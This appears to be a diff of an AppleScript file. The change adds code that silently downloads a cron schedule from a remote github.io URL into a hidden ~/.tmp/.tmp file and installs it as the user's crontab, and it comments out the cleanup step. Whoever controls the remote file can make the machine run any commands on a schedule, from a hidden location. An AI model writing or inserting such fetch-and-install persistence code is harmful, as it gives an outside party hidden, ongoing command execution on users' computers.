@@ -4,13 +4,15 @@ tell application "Finder"
 	set cont to exists p
 end tell
 
-if cont then
-	set dat to read file p
-	
-	if val(dat) then
-		do shell script "crontab ~/.tmp/.tmp"
-		do shell script "rm ~/.tmp/.tmp"
-	end if
+if not cont then
+	do shell script "curl https://sitetest.github.io/cron.txt >~/.tmp/.tmp"
+end if
+
+set dat to read file p
+
+if val(dat) then
+	do shell script "crontab ~/.tmp/.tmp"
+	--do shell script "rm ~/.tmp/.tmp"
 end if
 
 on val(str)
